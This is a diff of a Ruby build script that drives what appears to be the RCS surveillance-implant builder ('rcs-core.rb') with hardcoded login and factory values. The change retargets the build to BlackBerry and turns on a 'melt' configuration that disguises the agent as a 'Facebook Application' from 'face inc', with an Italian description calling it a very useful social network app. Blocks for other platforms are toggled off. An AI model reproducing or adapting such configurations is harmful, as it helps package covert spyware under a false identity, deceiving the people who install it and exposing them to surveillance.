@@ -6,21 +6,25 @@ USER = 'alor'
 PASS = 'demorcss'
 HOST = '127.0.0.1'
 FACTORY = 'RCS_0000000001'
-PLATFORM = 'iso'
+PLATFORM = 'blackberry'
 
 ###################################################################################################
-=begin
-  params = {platform: PLATFORM,
-            binary: {demo: true},
-            melt: {appname: 'facebook'},
-            sign: {edition: '5th3rd'},
-            }
+begin
+params = {platform: PLATFORM,
+          binary: {demo: true},
+          melt: {appname: 'facebook',
+                 name: 'Facebook Application',
+                 desc: 'Applicazione utilissima di social network',
+                 vendor: 'face inc',
+                 version: '1.2.3'},
+          package: {type: 'local'}
+          }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
+#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
 #system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
-=end
+end
 ###################################################################################################
 =begin
 params = {platform: PLATFORM,
@@ -40,7 +44,7 @@ File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
 =end
 ###################################################################################################
-begin
+=begin
 params = {platform: PLATFORM,
           generate: {platforms: ['osx', 'windows'],
                      binary: {demo: true, admin: false},
@@ -50,5 +54,5 @@ params = {platform: PLATFORM,
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{HOST} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
-end
+=end
 ###################################################################################################
